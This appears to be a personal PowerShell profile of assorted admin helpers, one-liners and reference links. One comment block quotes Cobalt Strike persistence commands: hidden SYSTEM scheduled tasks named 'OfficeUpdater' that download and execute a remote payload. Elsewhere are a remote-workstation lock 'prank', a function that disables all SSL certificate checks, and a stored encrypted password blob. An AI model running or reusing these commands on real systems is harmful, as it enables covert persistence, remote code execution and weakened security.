#$Password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000862959a992b18048b1b3f9973ceda084000000000200000000001066000000010000200000005c5878082b7f6920ad5816116040b6e6d682b83e5a08a9030f25a9e3526a7281000000000e8000000002000020000000d54d17d6724166100acc2c15de430717984b3e53c8ae3e58e75e4bd257ef52313000000032c9fc963f2b987085b4a77b0c8f2b1180a125ccd2fedf869ff57aa86eb767ecea5d55fcb541178338419dc8b925b9d7400000004d5d40666212b0f5c13303caac80e3dd5973e9f82ca8345c51a9760f77858d95a1259a786625faa97cf1ac292eee9459cddd87446191824ec5d142f6226c3ae0" | ConvertTo-SecureString 
#Store all of this in a format that PowerShell can use.
#$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $P

# $Epoch = New-Object -Type DateTime -ArgumentList 1970, 1, 1, 0, 0, 0, 0
# $Epoch.AddSeconds(("1412750187")) 
# ((get-date) - $epoch).totalseconds
# ($x=new-object xml).Load("http://rss.slashdot.org/Slashdot/slashdot");$x.RDF.item|?{$_.creator-ne"kdawson"}|fl descr*
#     slashdot reader sans the horrible submissions by mr. kdawson. Designed to be fewer than 120 chars which allows it to be used as signature on /.

# gps | select ProcessName -exp Modules -ea 0 | where {$_.modulename -match 'msvc'} | sort ModuleName | Format-Table ProcessName -GroupBy ModuleName

<# 
http://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
#(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onlogon /ru System
#(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onstart /ru System 
#(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onidle /i 30 
#(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onlogon /ru System
#(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onstart /ru System
#(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://127.0.0.1:8080/kBBldxiub6'''))'" /sc onidle /i 30
Each of these one liners assumes a 32-bit PAYLOAD.
#> 

 
function get-xpn ($text) { # Get an XPath Navigator object based on the input string containing xml
	$rdr = [System.IO.StringReader] $text
	$trdr = [system.io.textreader]$rdr
	$xpdoc = [System.XML.XPath.XPathDocument] $trdr
	$xpdoc.CreateNavigator()
}

<#
$snapins = @(
	"Quest.ActiveRoles.ADManagement",
	"PowerGadgets",
	"VMware.VimAutomation.Core",
	"NetCmdlets"
)
$snapins | ForEach-Object { 
  if (Get-PSSnapin -Registered $_ -ErrorAction SilentlyContinue) { Add-PSSnapin $_ }
}
#>

############################################################################## 
## Search the PowerShell help documentation for a given Regex 
##  Get-HelpMatch hashtable
##  Get-HelpMatch "(datetime|ticks)"
function apropos {
	param($searchWord = $(throw "Please specify content to search for"))
	$helpNames = $(get-help *)
	foreach($helpTopic in $helpNames)	{
	  $content = get-help -Full $helpTopic.Name | out-string
	  if($content -match $searchWord) { 
			 $helpTopic | select Name,Synopsis
	  }
	}
}


# Raoul Supercopter  http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file
function count {
    BEGIN { $x = 0 }
    PROCESS { $x += 1 }
    END { $x }
}

function product {
	BEGIN { $x = 1 }
	PROCESS { $x *= $_ }
	END { $x }
}

function sum {
	BEGIN { $x = 0 }
	PROCESS { $x += $_ }
	END { $x }
}

function average {
	BEGIN { $max = 0; $curr = 0 }
	PROCESS { $max += $_; $curr += 1 }
	END { $max / $curr }
}


function Get-Time { return $(get-date | foreach { $_.ToLongTimeString() } ) }
function promptXXX {
	# Write the time 
	write-host "[" -noNewLine
	write-host $(Get-Time) -foreground yellow -noNewLine
	write-host "] " -noNewLine
	# Write the path
	write-host $($(Get-Location).Path.replace($home,"~").replace("\","/")) -foreground green -noNewLine
	write-host $(if ($nestedpromptlevel -ge 1) { '>>' }) -noNewLine
	return "> "
}


function LL { # LS.MSH  Colorized LS function replacement # http://mow001.blogspot.com 
	param ($dir = ".", $all = $false) 
	$origFg = $host.ui.rawui.foregroundColor 
	if ( $all ) { $toList = ls -force $dir }
	else { $toList = ls $dir }
	foreach ($Item in $toList) { 
		Switch ($Item.Extension) { 
			".Exe" {$host.ui.rawui.foregroundColor = "Yellow"} 
			".cmd" {$host.ui.rawui.foregroundColor = "Red"} 
			".msh" {$host.ui.rawui.foregroundColor = "Red"} 
			".vbs" {$host.ui.rawui.foregroundColor = "Red"} 
			Default {$host.ui.rawui.foregroundColor = $origFg} 
		} 
		if ($item.Mode.StartsWith("d")) {$host.ui.rawui.foregroundColor = "Green"}
		$item 
	}  
	$host.ui.rawui.foregroundColor = $origFg 
}

function lla { param ($dir=".") ll $dir $true}
function la { ls -force }

# behave like a grep command but work on objects, used to be still be allowed to use grep
filter match  ($reg) { if ($_.tostring() -match $reg) { $_ } } 
# behave like a grep -v command but work on objects
filter exclude($reg) { if (-not ($_.tostring() -match $reg)) { $_ } } 
filter like  ($glob) { if ($_.toString() -like $glob) { $_ } }  # behave like match but use only -like
filter unlike($glob) { if (-not ($_.tostring() -like $glob)) { $_ } }
############################################################

### Load function / filter definition library
Get-ChildItem scripts:\lib-*.ps1 | % { . $_ write-host "Loading library file:`t$($_.name)" }
		
#   http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file

<#
# 32-bit only
# Exposes the environment vars in a batch and sets them in this PS session
function Get-Batchfile($file) {
	$theCmd = "`"$file`" & set" 
	cmd /c $theCmd | Foreach-Object {
		$thePath, $theValue = $_.split('=')
		Set-Item -path env:$thePath -value $theValue
	}
}


# Sets the VS variables for this PS session to use
function VsVars32($version = "9.0") {
	$theKey           = "HKLM:SOFTWARE\Microsoft\VisualStudio\" + $version
	$theVsKey         = get-ItemProperty $theKey
	$theVsInstallPath = [System.IO.Path]::GetDirectoryName($theVsKey.InstallDir)
	$theVsToolsDir    = [System.IO.Path]::GetDirectoryName($theVsInstallPath)
	$theVsToolsDir    = [System.IO.Path]::Combine($theVsToolsDir, "Tools")
	$theBatchFile     = [System.IO.Path]::Combine($theVsToolsDir, "vsvars32.bat")
	Get-Batchfile $theBatchFile
	[System.Console]::Title = "Visual Studio " + $version + " Windows Powershell"
}
#>

#   http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file


#==============================================================================
# Jared Parsons PowerShell Profile (jaredp@rantpack.org) 
$global:Jsh = new-object psobject  # Common Variables Start
$Jsh | add-member NoteProperty "ScriptPath" $(split-path -parent $MyInvocation.MyCommand.Definition) 
$Jsh | add-member NoteProperty "ConfigPath" $(split-path -parent $Jsh.ScriptPath)
$Jsh | add-member NoteProperty "UtilsRawPath" $(join-path $Jsh.ConfigPath "Utils")
$Jsh | add-member NoteProperty "UtilsPath" $(join-path $Jsh.UtilsRawPath $env:PROCESSOR_ARCHITECTURE)
$Jsh | add-member NoteProperty "GoMap" @{}
$Jsh | add-member NoteProperty "ScriptMap" @{}

function Jsh.Load-Snapin([string]$name) { # Load snapin's if they are available
	$list = @( get-pssnapin | ? { $_.Name -eq $name })
	if ( $list.Length -gt 0 ) { return; }
	$snapin = get-pssnapin -registered | ? { $_.Name -eq $name }
	if ( $snapin -ne $null ) { 			add-pssnapin $name 	} 
}
#==============================================================================


function Search-MSDNWin32 {  # msdn search for win32 APIs.
	$url = 'http://search.msdn.microsoft.com/?query=';
	$url += $args[0];
	for ($i = 1; $i -lt $args.count; $i++) {
		$url += '+';
		$url += $args[$i];
	}
	$url += '&locale=en-us&refinement=86&ac=3';
	Open-IE($url);
}

function Open-IE ($url) {    # Open Internet Explorer given the url.
	$ie = new-object -comobject internetexplorer.application;
	$ie.Navigate($url);
	$ie.Visible = $true;
}


#==============================================================================
# Christopher Douglas 
function Explore {      # explorer command
  param (  
		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="This is the path to explore...")]
		  [ValidateNotNullOrEmpty()] [string] $Target 
	)
	$exploriation = New-Object -ComObject shell.application
	$exploriation.Explore($Target)
}

Function RDP {
  param (  
		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="Server Friendly name")]
		  [ValidateNotNullOrEmpty()] [string]$server
	)
	cmdkey /generic:TERMSRV/$server /user:$UserName /pass:($Password.GetNetworkCredential().Password)
	mstsc /v:$Server /f /admin
	Wait-Event -Timeout 5
	cmdkey /Delete:TERMSRV/$server
}


function New-Explorer { #CLI prompt for password & restart explorer as $UserName
  taskkill /f /IM Explorer.exe   ######################### Problem if RDP
  runas /noprofile /netonly /user:$UserName explorer
}

Function Lock-RemoteWorkstationXXXXXX {   This is just because its funny.  PRANK
	param( 
		$Computername, 
		$Credential 
	) 
	if (!(get-module taskscheduler)) {Import-Module TaskScheduler} 
	New-task -ComputerName $Computername -credential:$Credential |  
	Add-TaskTrigger -In (New-TimeSpan -Seconds 30) | 
	Add-TaskAction -Script {  
		$signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();" 
    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru  
    $LockWorkStation::LockWorkStation() | Out-Null 
  } | Register-ScheduledTask TestTask -ComputerName $Computername -credential:$Credential 
}

Function llm { #lock Local machine lock computer
  $signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"  
	$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru  
	$LockWorkStation::LockWorkStation()|Out-Null
}


#==============================================================================
<#
1.List most recent version of files

ls -r -fi *.lis | sort @{expression={$_.Name}}, @{expression={$_.LastWriteTime};Descending=$true} | select Directory, Name, lastwritetime | Group-Object Name | %{$_.Group | Select -first 1}


2.gps programThatIsAnnoyingMe | kill


3.Open a file with its registered program (like start e.g start foo.xls)

ii foo.xls


4.Retrieves and displays the paths to the system's Special Folder's

[enum]::getvalues([system.environment+specialfolder]) | foreach {"$_ maps to " + [system.Environment]::GetFolderPath($_)}


5.Copy Environment value to clipboard (so now u know how to use clipboard!)

$env:appdata | % { [windows.forms.clipboard]::SetText($input) } 
OR
ls | clip
#>

#==============================================================================
<#
•List all type accelerators (requires PSCX): [accelerators]::get
•Convert a string representation of XML to actual XML: [xml]"<root><a>...</a></root>"
•Dump an object (increase depth for more detail): $PWD | ConvertTo-Json -Depth 2
•Recall command from history by substring (looking up earlier 'cd' cmd): #cd
•Access C# enum value: [System.Text.RegularExpressions.RegexOptions]::Singleline
•Generate bar chart (requires Jeff Hicks' cmdlet): ls . | select name,length | Out-ConsoleGraph -prop length -grid
•Part 1: Help, Syntax, Display and Files
•Part 2: Variables, Parameters, Properties, and Objects
•Part 3: Collections and Hash Tables
•Part 4: Files and Data Streams
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-help,-syntax,-display-and--files/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables,-parameters,-properties,-and-objects/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners--collections,-hashtables,-arrays-and-strings/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners--accessing,-handling-and-writing-data-/
#>

function get-uptime {
	$PCounter = "System.Diagnostics.PerformanceCounter"
	$counter = new-object $PCounter System,"System Up Time"
	$value = $counter.NextValue()
	$uptime = [System.TimeSpan]::FromSeconds($counter.NextValue())
	"Uptime: $uptime"
  "System Boot: " + ((get-date) - $uptime)
}
get-winevent -listprovider microsoft-windows* | % {$_.Name} | sort

#==============================================================================
https://github.com/jamesottaway?language=powershell&tab=stars
https://github.com/dfinke/ImportExcel  # Finke
https://github.com/dfinke?tab=repositories

#==============================================================================
# Using a target web service that requires SSL, but server is self-signed.  
# Without this, we'll fail unable to establish trust relationship. 
function Set-CertificateValidationCallback
{
    try
    {
       Add-Type @'
    using System;

    public static class CertificateAcceptor{

        public static void SetAccept()
        {
            System.Net.ServicePointManager.ServerCertificateValidationCallback = AcceptCertificate;
        }

        private static bool AcceptCertificate(Object sender,
                        System.Security.Cryptography.X509Certificates.X509Certificate certificate,
                        System.Security.Cryptography.X509Certificates.X509Chain chain,
                        System.Net.Security.SslPolicyErrors policyErrors)
            {
                Console.WriteLine("Accepting certificate and ignoring any SSL errors.");
                return true;
            }
    }
'@
    }
    catch {} # Already exists? Find a better way to check.

     [CertificateAcceptor]::SetAccept()
}
#==============================================================================
function Get-FolderSizes {
  [cmdletBinding()]
  param(
    [parameter(mandatory=$true)]$Path,
    [parameter(mandatory=$false)]$SizeMB,
    [parameter(mandatory=$false)]$ExcludeFolder
  ) #close param
  $pathCheck = test-path $path
  if (!$pathcheck) {"Invalid path. Wants gci's -path parameter."; break}
  $fso = New-Object -ComObject scripting.filesystemobject
  $parents = Get-ChildItem $path -Force | where { $_.PSisContainer -and $_.name -ne $ExcludeFolder }
  $folders = Foreach ($folder in $parents) {
    $getFolder = $fso.getFolder( $folder.fullname.tostring() )
    if (!$getFolder.Size) { #for "special folders" like appdata
      $lengthSum = gci $folder.FullName -recurse -force -ea silentlyContinue | `
        measure -sum length -ea SilentlyContinue | select -expand sum
      $sizeMBs = "{0:N0}" -f ($lengthSum /1mb)      
    } #close if size property is null
      else { $sizeMBs = "{0:N0}" -f ($getFolder.size /1mb) }
      #else {$sizeMBs = [int]($getFolder.size /1mb) }
    New-Object -TypeName psobject -Property @{
       name = $getFolder.path;
      sizeMB = $sizeMBs
    } #close new obj property
  } #close foreach folder
  #here's the output
  $folders | sort @{E={[decimal]$_.sizeMB}} -Descending | ? {[decimal]$_.sizeMB -gt $SizeMB} | ft -auto
  #calculate the total including contents
  $sum = $folders | select -expand sizeMB | measure -sum | select -expand sum
  $sum += ( gci -file $path | measure -property length -sum | select -expand sum ) / 1mb
  $sumString = "{0:n2}" -f ($sum /1kb)
  $sumString + " GB total" 
} #end function
set-alias gfs Get-FolderSizes

function get-drivespace {
  param( [parameter(mandatory=$true)]$Computer)
  if ($computer -like "*.com") {$cred = get-credential; $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer -credential $cred }
  else { $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer }  
  $qry | select `
    @{n="drive"; e={$_.deviceID}}, `
    @{n="GB Free"; e={"{0:N2}" -f ($_.freespace / 1gb)}}, `
    @{n="TotalGB"; e={"{0:N0}" -f ($_.size / 1gb)}}, `
    @{n="FreePct"; e={"{0:P0}" -f ($_.FreeSpace / $_.size)}}, `
    @{n="name"; e={$_.volumeName}} |
  format-table -autosize
} #close drivespace

function New-URLfile {
  param( [parameter(mandatory=$true)]$Target, [parameter(mandatory=$true)]$Link )
  if ($target -match "^\." -or $link -match "^\.") {"Full paths plz."; break}
  $content = @()
  $header = '[InternetShortcut]'
  $content += $header
  $content += "URL=" + $target
  $content | out-file $link  
  ii $link
} #end function

function New-LNKFile {
  param( [parameter(mandatory=$true)]$Target, [parameter(mandatory=$true)]$Link )
  if ($target -match "^\." -or $link -match "^\.") {"Full paths plz."; break}
  $WshShell = New-Object -comObject WScript.Shell
  $Shortcut = $WshShell.CreateShortcut($link)
  $Shortcut.TargetPath = $target
  $shortCut.save()
} #end function new-lnkfile

Poor man's grep? For searching large txt files.
function Search-TextFile {
  param( 
    [parameter(mandatory=$true)]$File,
    [parameter(mandatory=$true)]$SearchText
  ) #close param
  if ( !(test-path $File) ) {"File not found:" + $File; break}
  $fullPath = resolve-path $file | select -expand path
  $lines = [system.io.file]::ReadLines($fullPath)
  foreach ($line in $lines) { if ($line -match $SearchText) {$line} }
} #end function Search-TextFile

Lists programs installed on a remote computer. 
function Get-InstalledProgram { [cmdletBinding()] #http://blogs.technet.com/b/heyscriptingguy/archive/2011/11/13/use-powershell-to-quickly-find-installed-software.aspx
      param( [parameter(mandatory=$true)]$Comp,[parameter(mandatory=$false)]$Name )
      $keys = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
      TRY { $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp) }
      CATCH {
        $rrSvc = gwmi win32_service -comp $comp -Filter {name='RemoteRegistry'}
        if (!$rrSvc) {"Unable to connect. Make sure that this computer is on the network, has remote administration enabled, `nand that both computers are running the remote registry service."; break}
        #Enable and start RemoteRegistry service
        if ($rrSvc.State -ne 'Running') {
          if ($rrSvc.StartMode -eq 'Disabled') { $null = $rrSvc.ChangeStartMode('Manual'); $undoMe2 = $true }
          $null = $rrSvc.StartService() ; $undoMe = $true       
        } #close if rrsvc not running
          else {"Unable to connect. Make sure that this computer is on the network, has remote administration enabled, `nand that both computers are running the remote registry service."; break}
        $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp)  
      } #close if failed to connect regbase
      $out = @()
      foreach ($key in $keys) {
         if ( $RegBase.OpenSubKey($Key) ) { #avoids errors on 32bit OS
          foreach ( $entry in $RegBase.OpenSubKey($Key).GetSubkeyNames() ) {
            $sub = $RegBase.OpenSubKey( ($key + '\' + $entry) )
            if ($sub) { $row = $null
              $row = [pscustomobject]@{
                Name = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('DisplayName')
                InstallDate = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('InstallDate')
                Version = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('DisplayVersion')
              } #close row
              $out += $row
            } #close if sub
          } #close foreach entry
        } #close if key exists
      } #close foreach key
      $out | where {$_.name -and $_.name -match $Name}
      if ($undoMe) { $null = $rrSvc.StopService() }
      if ($undoMe2) { $null = $rrSvc.ChangeStartMode('Disabled') }
    } #end function

#==============================================================================
function IIS-startover {
    iisreset /restart
    iisreset /stop

    rm "C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\*.*" -recurse -force -Verbose

    iisreset /start
}
#==============================================================================

$str = 'param([string]$name,[string]$template)'
$ast = [System.Management.Automation.Language.Parser]::ParseInput($str, [ref]$null, [ref]$null)
$ast.ParamBlock.Parameters.Name.Extent.Text
$name
$template

#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
https://www.simple-talk.com/sysadmin/powershell/how-to-document-your-powershell-library/

http://www.powershellmagazine.com/2013/12/23/simplifying-data-manipulation-in-powershell-with-lambda-functions/

http://www.makeuseof.com/tag/windows-gets-package-manager-download-software-centrally-via-oneget/

wmI remote exec cmd.exe https://gallery.technet.microsoft.com/scriptcenter/56962f03-0243-4c83-8cdd-88c37898ccc4
https://blogs.technet.microsoft.com/heyscriptingguy/2012/01/02/find-the-top-ten-scripts-submitted-to-the-script-repository/
Engineering Efficiency: Scripts, Tools, and Software News in the IT World  http://blog.richprescott.com/
Client System Administration tool (v1.0.2)

http://alexfalkowski.blogspot.com/2012/08/functionalprogramming-in-powershell.html
https://github.com/alexfalkowski/documentation/commit/73e0581d313e27fa6e88b04fe5b2a5c101283c78

https://github.com/manojlds/pslinq

https://en.wikiversity.org/wiki/Windows_PowerShell/Functions

http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file 
https://github.com/tomasr/dotfiles/blob/master/.profile.ps1
https://github.com/tomasr/dotfiles
https://github.com/adjohnson916/PowerShell-profile
https://github.com/adjohnson916/PowerShell-profile/blob/master/Microsoft.PowerShell_profile.ps1
https://github.com/pagebrooks/PowerShell-Profile/blob/master/Microsoft.PowerShell_profile.ps1
https://github.com/bdukes/PowerShell-Profile
https://gist.github.com/i-e-b/1767387
https://github.com/frigus02/powershell-profile
https://github.com/frigus02/powershell-profile/commit/245994257f52325e1072ab2e78394f4dbfac9145
https://github.com/spmason/powershell-profile
https://github.com/keithbloom/powershell-profile
https://github.com/DeadlyBrad42/Powershell-Profile
https://github.com/scottmuc/poshfiles
https://gist.github.com/cloudRoutine/87c17655405cd8b1eac7
https://github.com/spmason/powershell-profile/blob/master/profile.ps1
https://github.com/BretFisher/PowerShell-Profile/blob/master/Microsoft.PowerShell_profile.ps1

http://benherman.com/ftp/PowerShellFunctions.ps1

http://www.mikefal.net/scripts/Powershell_tips_tricks.ps1


function Reduce($initial, $sb) {
  begin { $result = $initial }
  process {
    $result = & $sb $result $_
  }
  end { $result }
}

$sb = { param($x, $y) $x + $y }

1..5 | Reduce 0 $sb
Update 9/9/2014: Although, conveniently, the ForEach-Object takes a Begin and End block.
PS> 1..5 | % { $result = 0 } { $result += $_ } { $result } # % is an alias for ForEach-Object
15



filter num2x { $_ -replace "\d","x" }
Get-Content test.txt | num2x | add-content new.txt 


















